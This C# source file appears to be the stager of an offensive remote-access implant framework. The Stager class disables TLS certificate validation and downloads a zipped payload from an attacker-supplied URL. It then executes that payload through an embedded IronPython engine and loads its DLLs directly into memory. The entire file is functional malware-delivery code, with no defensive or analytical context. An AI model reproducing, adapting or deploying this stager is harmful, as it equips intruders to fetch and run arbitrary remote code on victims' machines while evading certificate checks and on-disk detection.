using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using System.Runtime.InteropServices;

namespace Kaliya
{
    [ComVisible(true)]
    public static class Stager
    {
        static ZipStorer Stage;

        static Stager()
        {
            ServicePointManager.ServerCertificateValidationCallback +=
                                 (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 |
                                                   (SecurityProtocolType)3072;
            ServicePointManager.Expect100Continue = false;

            AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
        }

        public static void Run(string url)
        {
            Guid GUID = Guid.NewGuid();
            Uri URL = new Uri(new Uri(url), GUID.ToString());
#if DEBUG
            Console.WriteLine("[+] URL: {0}", URL);
#endif
            try
            {
#if DEBUG
                Console.WriteLine("[+] Trying to get the stage...");
#endif
                Stage = ZipStorer.Open(Core.DownloadStage(URL),
                                       FileAccess.ReadWrite,
                                       true);
            }
            catch
            {
#if DEBUG
                Console.WriteLine("\n\n[!] ERROR: Unable to get the stage.");
#endif
                Environment.Exit(-1);
            }
#if DEBUG
            Console.WriteLine("[+] Running the Engine...");
#endif
            Engines.IronPython.Run(URL, GUID, Stage); //Magic!!
        }

        static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
        {
            string dllName = Core.GetDLLName(args.Name);
#if DEBUG
            Console.WriteLine("\t[-] '{0}' was required...", dllName);
#endif
            byte[] bytes = Core.GetResourceInZip(Stage, dllName) ??
                File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() +
                                  dllName);
#if DEBUG
            Console.WriteLine("\t[+] '{0}' loaded...", dllName);
#endif
            return Assembly.Load(bytes);
        }
    }
}